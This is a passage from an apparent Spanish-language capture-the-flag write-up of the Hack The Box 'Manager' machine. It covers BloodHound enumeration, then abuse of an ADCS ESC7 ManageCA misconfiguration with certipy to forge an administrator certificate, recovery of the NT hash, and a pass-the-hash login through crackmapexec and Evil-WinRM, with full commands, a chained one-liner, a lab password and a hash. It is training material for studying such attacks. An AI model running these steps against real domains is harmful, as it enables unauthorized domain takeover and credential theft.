Info: Uploading ../content/SharpHound.exe to C:\Users\Raven\Documents\BH\SharpHound.exe
                                        
Data: 1402880 bytes of 1402880 bytes copied
                                        
Info: Upload successful!
```

Ejecútalo:
```batch
*Evil-WinRM* PS C:\Users\Raven\Documents\BH> .\SharpHound.exe -c All
2024-10-13T23:15:42.4798539-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-10-13T23:15:42.6673525-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-13T23:15:42.6829758-07:00|INFORMATION|Initializing SharpHound at 11:15 PM on 10/13/2024
2024-10-13T23:15:42.8079815-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for manager.htb : dc01.manager.htb
2024-10-13T23:15:42.9486381-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-13T23:15:43.1829946-07:00|INFORMATION|Beginning LDAP search for manager.htb
2024-10-13T23:15:43.2454912-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-10-13T23:15:43.2454912-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-10-13T23:16:13.2455359-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2024-10-13T23:16:28.1517261-07:00|INFORMATION|Consumers finished, closing output channel
2024-10-13T23:16:28.1829789-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-10-13T23:16:28.4017281-07:00|INFORMATION|Status: 98 objects finished (+98 2.177778)/s -- Using 42 MB RAM
2024-10-13T23:16:28.4017281-07:00|INFORMATION|Enumeration finished in 00:00:45.2255542
2024-10-13T23:16:28.4798646-07:00|INFORMATION|Saving cache with stats: 57 ID to type mappings.
 57 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-10-13T23:16:28.4954797-07:00|INFORMATION|SharpHound Enumeration Completed at 11:16 PM on 10/13/2024! Happy Graphing!
```

Una vez que descargues el **archivo ZIP** resultante de usar **SharpHound**, cárgalo al **BloodHound**:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura9.png">
</p>

Investigando un poco con lo que obtuvimos, descubrí que no hay un vector de ataque que podamos usar.

Observa la información que obtuvimos del **usuario raven** del que tenemos su contraseña:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura10.png">
</p>

No puede alcanzar a algún usuario privilegiado y no pertenece a un grupo en específico del que nos podamos aprovechar.

A excepción de este grupo:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura11.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura12.png">
</p>

Ese grupo no tiene un privilegio del que nos podamos aprovechar:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura13.png">
</p>

Entonces, en caso de no encontrar algo que nos ayude a escalar privilegios vía **BloodHound**, es bueno usar **adPEAS** como segunda opción y también revisar las plantillas de certificación del **AD**.

### Abusando de ADCS: Explotando Permiso ManageCA de Usuario Raven Aplicándole la Técnica ESC7 con certipy {#ADCS}

Primero que nada, ¿Qué es **ADCS**?

| **Servicios de certificados de Active Directory (ADCS)** |
|:-----------:|
| *Servicios de certificados de Active Directory (AD CS) es un rol de Windows Server para emitir y administrar certificados de infraestructura de clave pública (PKI) que se usan en protocolos de autenticación y comunicación seguros. Los certificados digitales se pueden usar para cifrar y firmar digitalmente documentos electrónicos y mensajes, así como para la autenticación de cuentas de equipo, usuario o dispositivo en una red.* |

Con la herramienta **certipy**, podemos identificar si hay un certificado vulnerable.

De aquí la puede obtener:
* <a href="https://github.com/ly4k/Certipy" target="_blank">Repositorio de ly4k: Certipy</a>

Una vez que ya lo tengas instalado o compilado, lo primero que podemos hacer es probarlo usando las credenciales que tenemos.

Primero usaremos el comando **find** de **certipy**, añadiendo las credenciales y la IP de la máquina (`-dc-ip`), le indicaremos que muestre solo plantillas de certificados vulnerables basadas en pertenencias a grupos anidados (`-vulnerable`) y que muestre el resultado en la terminal al finalizar (`-stdout`):
```bash
certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```
Nos dio un resultado.

Parece que nuestro **usurio raven** tiene permisos que nos pueden permitir escalar privilegios, pues está dentro de los permisos **ManageCa** del **Certificate Authorities**.

Investiguemos estos dos conceptos:

| **Certified Authorities** |
|:-----------:|
| *Una entidad de certificación (CA) se encarga de avalar la identidad de usuarios, equipos y organizaciones. Las CA autentican una entidad y responden por ella emitiendo un certificado firmado digitalmente.* |

| **Permiso ManageCA** |
|:-----------:|
| *El permiso ManageCA permite a un usuario modificar la configuración de la CA lo que, entre otras cosas, permite activar a nivel de CA el uso de SANs (Subject Alternative Name), sobrescribiendo de esta manera la configuración de todas las plantillas gestionadas por la Autoridad Certificadora.* |

Creo que queda claro que es un **CA y el permiso ManageCA**.

En la respuesta que obtuvimos, nos indica que hay una técnica que podemos usar para explotar esta vulnerabilidad, que sería el **ESC7 (Escalada 7)** y que podemos ver sus instrucciones en el **GitHub**.

La idea es simple: vamos a suplantar al usuario administrador para generar un certificado que nos permita obtener el **hash NT** del administrador.

Lo malo, es que tendremos que ser rápidos, pues cuando intentemos generar ese certificado, se puede llegar a reiniciar y tendríamos que hacer los pasos desde el principio.

#### Aplicando Técnica ESC7 {#ESC7}

| **Técnica ESC7** |
|:-----------:|
| *ESC7 se produce cuando un usuario tiene el derecho de acceso Gestionar CA o Gestionar certificados en una CA. No existen técnicas públicas que permitan abusar del derecho de acceso a Gestionar Certificados para escalar privilegios de dominio, pero puede utilizarse para emitir o denegar solicitudes de certificados pendientes.* |

Para que podamos aplicar esta técnica, necesitamos que el usuario tenga el permiso **ManageCA** (que sí tiene), tenga el permiso **Manage Certificates** y que esté habilitada la plantilla **SubCA** (que igual la tiene activa).

En nuestro caso, nos falta el permiso **Manage Certificates**, por lo que primero debemos agregar nuestro usuario como un nuevo oficial que tenga ese permiso faltante.

Empecemos:
```bash
certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```
Quedo agregado. Ahora sí cumplimos con los pre requisitos de la técnica.

Empezamos el ataque.

Para empezar, solicitamos un certificado basado en la **plantilla SubCA**.
```bash
certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 26
Would you like to save the private key? (y/N) y
[*] Saved private key to 26.key
[-] Failed to request certificate
```
Esta solicitud será denegada, pero guardaremos la clave privada y anotaremos el ID de la solicitud.

Ahora, podemos emitir la solicitud de certificado denegada con el comando `ca` y el parámetro `-issue-request`, que sería el **Request ID**:
```bash
certipy ca -ca 'manager-DC01-CA' -issue-request 26 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Vamos muy bien.

Por último, podemos recuperar el certificado emitido con el comando `req` y el parámetro `-retrieve`, que sería el mismo **Request ID**:
```bash
certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 26
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 26
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '26.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
Excelente, hemos concluido el ataque con éxito.

En caso de que tengas algún error por el tiempo que toma realizar este ataque, puedes usar este oneliner que ejecuta todos los pasos que hemos hecho, solo identifica bien el número del **Request ID** que podrías obtener, ya que es el único dato que hay que cambiar en caso de que falle:
```bash
certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb && certipy ca -ca 'manager-DC01-CA' -issue-request <requestID> -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve <requestID>
```

Aquí te dejo un ejemplo de cómo funciona el oneliner:
```bash
certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb && certipy ca -ca 'manager-DC01-CA' -issue-request 23 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 23
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 24
Would you like to save the private key? (y/N) y
[*] Saved private key to 24.key
[-] Failed to request certificate
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 23
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[!] Could not find matching private key. Saving certificate as PEM
[*] Saved certificate to 'administrator.crt'
```
Continuemos.

Antes de aplicar la última parte del ataque, siempre es necesario que nuestra máquina tenga el mismo horario que la máquina víctima, pues así es el funcionamiento del **servicio Kerberos**, ya que si no están sincronizados con el mismo horario, pueden fallar muchos ataques y este en particular.

Para tener el mismo horario, usaremos el comando **ntpdate** y le indicamos el nombre del servidor de la máquina víctima:
```bash
ntpdate -u dc01.manager.htb
2024-10-13 06:04:27.985161 (-0600) +25209.632306 +/- 0.034093 dc01.manager.htb 10.10.11.236 s1 no-leap
CLOCK: time stepped by 25209.632306
```
Ya están sincronizados.

Para que podamos obtener el **hash NT** del certificado del administrador que ya creamos, usaremos el comando **auth**.

Este comando utilizará la extensión **PKINIT Kerberos** o el **protocolo Schannel** para la autenticación con el certificado proporcionado. **Kerberos** se puede utilizar para recuperar un **TGT** y el **hash NT** para el usuario de destino, mientras que **Schannel** abrirá una conexión a **LDAPS** y caerá en un shell interactivo con comandos **LDAP** limitados.

Por defecto, **Certipy** intentará extraer el nombre de usuario y el dominio del certificado (`-pfx`) para la **autenticación vía Kerberos**.

Y para evitar problemas, indicaremos el usuario administrador, el dominio y la IP: 
```bash
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```
Tenemos el **hash NT**, podemos aplicar el **ataque pass-The-hash**, pero hay que comprobar si en verdad nos sirve este **hash**.

Lo comprobaremos con **crackmapexec**:
```bash
crackmapexec smb 10.10.11.236 -u 'administrator' -H 'ae5064c2f62317332c88629e025924ef'
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)
```
Funciona.

Ahora en **WinRM**:
```bash
crackmapexec winrm 10.10.11.236 -u 'administrator' -H 'ae5064c2f62317332c88629e025924ef'
SMB         10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
WINRM       10.10.11.236    5985   DC01             [+] manager.htb\administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)
```
Igual funciona.

Si bien podemos usar **PsExec**, también podemos usar **Evil-WinRM** para conectarnos como el administrador y buscar la flag:
```batch
evil-winrm -i 10.10.11.236 -u 'administrator' -H 'ae5064c2f62317332c88629e025924ef'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
manager\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/13/2024  12:10 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```
Con esto, hemos completado la máquina.
